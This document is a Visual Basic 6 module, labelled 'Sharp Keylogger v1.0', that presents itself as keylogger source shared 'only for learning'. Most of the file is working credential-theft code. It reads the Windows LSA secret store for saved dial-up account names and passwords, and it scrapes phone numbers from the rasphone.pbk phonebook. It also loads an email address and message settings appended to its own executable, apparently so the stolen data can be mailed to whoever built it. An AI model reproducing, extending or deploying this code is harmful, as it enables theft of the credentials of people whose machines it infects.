Attribute VB_Name = "Module1"
'Sharp Keylogger v1.0
'This Keyloger Source Only For Learning
'Coded By : Sharp Soft
'----------------------------
'Y! ID : Sharp_h2001
'Msn ! : Sharp.Soft
'Email : Sharp.Secure@Gmail.Com
'----------------------------
'wWw.Sharp-Soft.nEt
'wWw.Sharp.Blogfa.cOm
'----------------------------

Option Explicit

Private Type Dialup
    User As String
    Pass As String
    UID As String
    Tel As String
End Type

Private Type PLSA_UNICODE_STRING
    Length  As Integer
    MaximumLength As Integer
    Buffer As Long
End Type

Private Type PLSA_OBJECT_ATTRIBUTES
    Length As Long
    RootDirectory As Long
    ObjectName As PLSA_UNICODE_STRING
    Attributes As Long
    SecurityDescriptor As Long
    SecurityQualityOfService As Long
End Type

Private Declare Sub LsaClose Lib "ADVAPI32.dll" (ByRef ObjectHandle As Long)
Declare Function GetLengthSid Lib "ADVAPI32.dll" (pSid As Any) As Long
Declare Function LookupAccountName Lib "ADVAPI32.dll" Alias "LookupAccountNameA" (lpSystemName As String, ByVal lpAccountName As String, ByRef Sid As Any, cbSid As Long, ByVal ReferencedDomainName As String, cbReferencedDomainName As Long, peUse As Long) As Long
Private Declare Function ConvertSidToStringSid Lib "ADVAPI32.dll" Alias "ConvertSidToStringSidA" _
(ByRef Sid As Any, ByRef StringSid As Long) As Long

Private Declare Function LsaRetrievePrivateData Lib "ADVAPI32.dll" _
    (ByRef PolicyHandle As Long, ByRef KeyName As PLSA_UNICODE_STRING, _
    ByRef PrivateData As Long) As Long

Public Declare Function LsaOpenPolicy Lib "ADVAPI32.dll" _
    (ByRef SystemName As PLSA_UNICODE_STRING, ByRef ObjectAttributes As PLSA_OBJECT_ATTRIBUTES, _
    ByVal DesiredAccess As Long, ByRef PolicyHandle As Long) As Long

Public Declare Sub CopyMem Lib "kernel32" Alias "RtlMoveMemory" _
        (pTo As Any, _
        uFrom As Any, _
        ByVal lSize As Long)
Declare Function NetApiBufferFree Lib "netapi32" _
        (ByVal lBuffer&) As Long

Declare Function WideCharToMultiByte Lib "kernel32" (ByVal codepage As Long, ByVal dwFlags As Long, lpWideCharStr As Any, ByVal cchWideChar As Long, lpMultiByteStr As Any, ByVal cchMultiByte As Long, ByVal lpDefaultChar As String, ByVal lpUsedDefaultChar As Long) As Long

Public Type FileOption
 email As String
 size As String
 title As String
 message As String
End Type
Public FO As FileOption
Public AllPass(20) As Dialup
Public c As Long
Public appp As String

Public Function bkh()

Dim UserName As String
Dim Sid() As Byte
Dim SIDSize As Long
Dim DomainName As String
Dim DomainSize As Long
Dim i As Long
Dim oa As PLSA_OBJECT_ATTRIBUTES
Dim cnn As String
Dim cname As String

Dim sName As PLSA_UNICODE_STRING

Dim Buf As PLSA_UNICODE_STRING
Dim k As Long

c = 0
UserName = Environ("USERNAME")
ReDim Sid(255)
Call LookupAccountName(vbNullString, UserName, Sid(0), SIDSize, DomainName, DomainSize, i)
DomainName = Space(DomainSize)
ReDim Sid(SIDSize - 1)
Call LookupAccountName(vbNullString, UserName, Sid(0), SIDSize, DomainName, DomainSize, i)

cnn = "RasDialParams!" & SIDToString(Sid) & "#0"
CreateUnicodeString cnn, sName
'Call LsaOpenPolicy(Buf, oa, &HF0FFF, i)
Call LsaOpenPolicy(Buf, oa, 4, i)
Call LsaRetrievePrivateData(ByVal i, sName, k)
LsaClose i

If k = 0 Then
    cnn = "L$_RasDefaultCredentials#0"
    CreateUnicodeString cnn, sName
'    Call LsaOpenPolicy(Buf, oa, &HF0FFF, i)
    Call LsaOpenPolicy(Buf, oa, 4, i)
    Call LsaRetrievePrivateData(ByVal i, sName, k)
    LsaClose i
End If

If k = 0 Then Exit Function

Dim l As Long
Dim b() As Byte

CopyMem l, ByVal k, 2
CopyMem sName.Buffer, ByVal (k + 4), 4

ReDim b(l + 1)
CopyMem b(0), ByVal sName.Buffer, l

ReadLsa b, l

Dim Pbk As String
Pbk = Environ("ALLUSERSPROFILE") & _
    "\Application Data\Microsoft\Network\Connections\Pbk\rasphone.pbk"

Dim S As String

On Error GoTo er:
    
For i = 0 To c - 1
    
Open Pbk For Input As #1
    
    Do
        Input #1, S
    Loop While (InStr(S, AllPass(i).UID) = 0)
    
    Do
        Input #1, S
        l = InStr(Trim(S), "PhoneNumber=")
    Loop While (l <> 1)
    
    AllPass(i).Tel = Replace(S, "PhoneNumber=", "")

Close #1

Next

er:

Close #1

End Function

Public Function SIDToString(Sid() As Byte) As String

Dim Tmp(255) As Byte
Dim i As Long

Call ConvertSidToStringSid(Sid(0), i)
    CopyMem Tmp(0), ByVal i, 255

For i = 0 To 254
    If Tmp(i) = 0 Then Exit For
    SIDToString = SIDToString & Chr(Tmp(i))
Next

End Function
Private Sub CreateUnicodeString(ByVal lpMultiByteStr As String, _
   UnicodeBuffer As PLSA_UNICODE_STRING)
    Dim cchMultiByte As Long
   
    cchMultiByte = Len(lpMultiByteStr)
    UnicodeBuffer.Length = cchMultiByte * 2
    UnicodeBuffer.MaximumLength = UnicodeBuffer.Length + 4
    UnicodeBuffer.Buffer = StrPtr(lpMultiByteStr)

End Sub


Public Function ReadLsa(Data() As Byte, size As Long)

Dim i As Long, j As Long, k As Long
Dim ss As String, cc As String
Dim dd(20, 9) As String

For i = 0 To size - 2 Step 2
cc = GetString(VarPtr(Data(i)))

If cc = "" Then
    Select Case j
    
        Case 6: AllPass(k).Pass = ss
        Case 5: AllPass(k).User = ss
        Case 0: AllPass(k).UID = ss
    End Select
        j = j + 1
    ss = ""

Else
    ss = ss + cc
    If j = 9 Then
        j = 0
        ss = ""
        k = k + 1
    End If
End If

Next
                             
c = k + 1

End Function

Public Function GetString(adrData As Long) As String

Dim sRtn As String
sRtn = String$(2, 0)    ' 2 bytes/char

WideCharToMultiByte 0, 0, ByVal adrData, -1, ByVal sRtn, 1, 0, 0
    
    If InStr(sRtn, vbNullChar) Then
        sRtn = Left$(sRtn, InStr(sRtn, vbNullChar) - 1)
    End If

GetString = sRtn

End Function


Public Function GetFileOption() As FileOption
On Error Resume Next
Dim Bf, Rc As Long, OptData As String
Dim pathw As String
Dim OptArray
'$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
Dim OptionDlimiter$
OptionDlimiter$ = "-" & Chr$(12)
'$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
If Right(App.Path, 1) <> "\" Then
appp = App.Path & "\" & App.EXEName & ".exe"
Else
appp = App.Path & App.EXEName & ".exe"
End If

pathw = appp
Open pathw For Binary As #1
Bf = Input(LOF(1), #1)
Close #1
OptData = Mid$(Bf, (InStr(1, Bf, OptionDlimiter)) + Len(OptionDlimiter))
OptArray = Split(OptData, "$#$~")
GetFileOption.email = CStr(OptArray(1))
GetFileOption.size = CLng(OptArray(2))
GetFileOption.title = CStr(OptArray(3))
GetFileOption.message = CStr(OptArray(4))
End Function

